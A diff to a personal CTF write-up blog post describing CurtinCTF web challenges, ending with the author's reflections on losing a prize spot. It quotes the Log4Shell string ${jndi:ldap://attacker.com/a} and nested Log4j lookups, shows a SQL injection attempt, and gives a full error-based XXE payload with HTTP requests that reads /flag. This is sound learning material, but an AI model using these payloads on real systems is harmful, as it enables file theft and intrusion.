@@ -6,6 +6,8 @@ tags: []
 image: https://github.com/user-attachments/assets/baf15847-33f5-4fb9-9913-338845122179
 ---
 
+I will update more on some other challenges i sovled which in misc, forensic and osint category!
+
 # Web 
 
 ## Agent Jonathan Walkins Trafalgar
@@ -214,23 +216,162 @@ https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/
 
 <img width="906" height="880" alt="Screenshot 2025-12-08 145933" src="https://github.com/user-attachments/assets/6b05d68a-2562-42ba-b76d-e1a90861c323" />
 
-The Google CTF 2022 Log4j challenge was about exploiting logging behavior in a backend using Log4j 2.17.2. Instead of the classic Log4Shell exploit (which was patched), the challenge focused on tricking Log4j into leaking the flag through its logging patterns.
+The Google CTF 2022 Log4j challenge was about exploiting logging behavior in a backend using Log4j 2.17.2. Instead of the classic Log4Shell exploit (which was patched), the challenge focused on tricking nested Log4j lookups into leaking the flag through its logging patterns.
 
-So in short, the challenge was a twist: you could not use the famous Log4Shell exploit, but you had to abuse Log4j’s logging features to extract the flag.
+So in short, the challenge was a twist: you could not use the famous Log4Shell exploit ${jndi:ldap://attacker.com/a}, but you had to abuse **[java Log4j’s lookups](https://logging.apache.org/log4j/2.x/manual/lookups.html#JavaLookup)** logging features to extract the flag.
 
 From my understanding based on the writeups, the challenge required us to use a nested payload instead of directly reading the environment variable. The usual idea of using something like ${env:FLAG} was not enough because the patched version of Log4j blocked the straightforward routes.
 
-Instead, the solution involved combining lookups so that one lookup would expand into another. For example, a payload such as ${java:runtime:${env:FLAG}} first resolves the inner part ${env:FLAG} to the flag value, then passes that into the outer lookup ${java:runtime:...} which gets logged. This nesting allowed the flag to be revealed through the logging process even though the direct environment lookup was restricted.
+Instead, the solution involved combining lookups so that one lookup would expand into another. For example, a payload such as ${java:${env:FLAG}} first resolves the inner part ${env:FLAG} to the flag value, then passes that into the outer lookup ${java:...} which gets logged. This nesting allowed the flag to be revealed through the logging process even though the direct environment lookup was restricted.
 
 So the key point is that the challenge was not about the classic Log4Shell exploit but about abusing Log4j’s lookup features in a nested way to leak the flag.
 
 <img width="1877" height="706" alt="Screenshot 2025-12-08 121308" src="https://github.com/user-attachments/assets/8c9fc644-dae1-4d6b-9b85-45d7f2a3c117" />
 
+```
+CURTIN_CTF{l0g4j_rce_v1a_jnd1_1nj3ct10n}
+```
 
-# Beyond the flags:
+## Brailley
 
-![CTF-2025-1260x630](https://github.com/user-attachments/assets/baf15847-33f5-4fb9-9913-338845122179)
+The Brailley web app takes a city name, encodes it into a numeric sequence using a custom alphabet mapping, sends that sequence to the backend, and the backend returns the location details of the nearest blind association center.
+
+<img width="1603" height="726" alt="image" src="https://github.com/user-attachments/assets/5cdd1640-2419-4dd3-b805-8e8250b60a0a" />
+
+From the /static/post.js
+
+```
+  var blindvalues = [
+    '10',    '120',   '140',    '1450',   '150',   '1240',  '12450',
+    '1250',  '240',   '2450',   '130',    '1230',  '1340',  '13450',
+    '1350',  '12340', '123450', '12350',  '2340',  '23450', '1360',
+    '12360', '24560', '13460',  '134560', '13560',
+  ];
+```
+The encoding is just a letter‑to‑number substitution, where every letter A–Z has its own numeric code. The frontend converts the city name into numbers, sends it, and the backend translates it back.
+
+We can demonstrate this through the request:
+```
+POST /api/search HTTP/1.1
+
+Host: curtinctfmy-brailley.chals.io
+Content-Length: 38
+Sec-Ch-Ua-Platform: "Linux"
+Accept-Language: en-GB,en;q=0.9
+Sec-Ch-Ua: "Chromium";v="141", "Not?A_Brand";v="8"
+Content-Type: application/json
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
+Accept: */*
+Origin: https://curtinctfmy-brailley.chals.io
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://curtinctfmy-brailley.chals.io/
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+Connection: keep-alive
+
+{"message":"135601360123502401401250"}
+```
+Result to this response:
+```
+HTTP/1.1 200 OK
+Server: gunicorn/19.9.0
+Date: Tue, 09 Dec 2025 03:10:01 GMT
+Connection: close
+Content-Type: application/json; charset=utf-8
+Content-Length: 134
+
+{"ValueSearch": "Welcome! Our center is located in Brandschenkestrasse 110, 8002 Zurich, Opening hours for this center is 8:00-17:00"}
+```
+When you select a city like **Zurich**, the frontend script converts each letter into its numeric code:
+```
+Z -> 13560
+U -> 1360
+R -> 12350
+I -> 240
+C -> 140
+H -> 1250
+```
+Concatenate these values gives `135601360123502401401250`. That encoded string is what gets sent in the request body:
+
+```
+{"message":"135601360123502401401250"}
+```
+The backend then decodes it back into letters and returns the location details for that city.
+Now, the question is: how does this lead us to the flag? Naturally, I tried encoding the word `flag` using the same scheme and sending it as the request message:
+```
+{
+"message":"124012301012450"
+} 
+```
+The response was:
+```
+HTTP/1.1 200 OK
+Server: gunicorn/19.9.0
+Date: Tue, 09 Dec 2025 03:41:16 GMT
+Connection: close
+Content-Type: application/json; charset=utf-8
+Content-Length: 34
+
+{"ValueSearch": "No result found"}
+```
+I told myself: **“I’m not stopping here.”** With confidence, I tried some SQL injections like `' OR 1=1 --` thinking it might work. It didn’t.
+
+The server responded with: _“Nice try, hengker. No 800‑point freebies today.”_
+
+Next, I turned to GPT, hoping for help. Instead, it misled me further.
+
+Finally, I relied on Google dorking as my last resort. That’s when I found the **[writeups](https://github.com/w181496/CTF/blob/master/googlectf-2019-qual/bnv/README_en.md)** I needed.
+
+However i would explain this from my understanding, application/json if being misconfigured can led to application/xml which from this could lead to another things which is XXE injection
+
+So we would look for **PayloadsAllTheThings** to find classis XXE payload to retrive files, However we would try with confirmed there to verify our POC
+
+Start by switching the request from `application/json` to `application/xml` to see if the server accepts **XML input**. Then add a simple DOCTYPE declaration to confirm whether **DTDs are allowed**. Next, try a harmless internal entity to check if entity expansion works. After that, attempt an external entity such as file **:///etc/passwd** to see if external resolution is enabled. If direct output is not shown, move on to blind XXE techniques like error-based or out-of-band methods to confirm data leakage. Only after confirming each step should you proceed to the final payload for exploitation.
+
+The final payload works by combining three parts: first an external entity to read a local file like `/flag`, then a parameter entity to embed that file’s contents, and finally an error-based expansion that forces the parser to leak the data through its error message. This chain confirms the vulnerability and allows exploitation.
+
+```
+POST /api/search HTTP/1.1
+Host: curtinctfmy-brailley.chals.io
+Content-Type: application/xml
+Content-Length: 327
+
+<?xml version="1.0" encoding="UTF-8"?> 
+<!DOCTYPE message[ 
+  <!ELEMENT message ANY >
+  <!ENTITY % NUMBER '<!ENTITY &#x25; file SYSTEM "file:///flag">
+  <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%NUMBER;
+]> 
+<message>a</message>
+```
+
+<img width="1285" height="577" alt="image" src="https://github.com/user-attachments/assets/7af038f3-5770-46e9-bc7e-b134e83bdd2f" />
+
+```
+CURTIN_CTF{⠞⠓⠼⠉_⠼⠚⠝⠑_⠺⠓⠕_⠋⠑⠼⠉⠇_⠼⠁⠞_⠁⠇⠇_⠺⠊⠞⠓⠼⠚⠥⠞_⠎⠑⠑⠼⠁⠝⠛_⠊⠞_⠼⠙⠇⠇}
+```
+
+# Yaps:
+
+This CTF was a long ride. We played hard, learned a lot, and felt both happy and sad along the way.
+
+Near the end, we @BlueSmurf were holding 7th place. That spot mattered because it was the last prize spot. If I had solved the last web challenge, we could have stayed there. But in the last five minutes, we dropped from 7th to 10th. The organizers said no flag hoarding, but it still happened. I don’t want to show too many screenshots or complain too much, but it hurt.
+
+What made me sad was not just losing the place, but seeing how much time my teammates Afiq and Akmal gave to this. We stayed strong all event, moving between 1st and 7th place, fighting to keep our spot. Losing it at the end felt heavy.
+
+It was also very tiring. On Friday evening I joined an online CTF, then at night StoutCTF started. I played from 10pm until 8:30am Saturday without sleep. I think I slept a little, then woke up around 11am to continue CurtinCTF. We kept pushing and stayed near the top until the last moment when flag hoarding knocked us down.
 
 <img width="1523" height="594" alt="image" src="https://github.com/user-attachments/assets/1e6e6575-454c-4964-98c0-951450df2599" />
 
-<img width="1524" height="871" alt="image" src="https://github.com/user-attachments/assets/23c02b7b-27d4-4a64-9675-db690a98d0ae" />
+And honestly, it’s tiring to lose multiple CTFs in just two weeks in a row, especially after getting so close to prizes so many times. SherpaCTF slipped away because of my dumb careless mistake — I didn’t even check robots.txt. IBOH Stage 2 attack and defence was another heartbreak, dropping from 2nd to 7th because I didn’t patch fast enough. Then IGOH Stage 2, where I ended up 13th and played really bad. I started very, very slow, and by the time I tried to catch up it was already too late.
+
+Even though we didn’t win any prizes, I still walked away with something valuable. Placements come and go, but the lessons stay. What matters most is the time spent learning and playing together with my teammates. We gave it our best, and even if the scoreboard didn’t end in our favor, the experience itself was worth it.
+
+At least, now I know that even when I miss robots.txt, forget to patch, or start too slow, I can still laugh at myself and keep going. Next time, I’ll come back sharper… or at least with fewer dumb mistakes. 😅
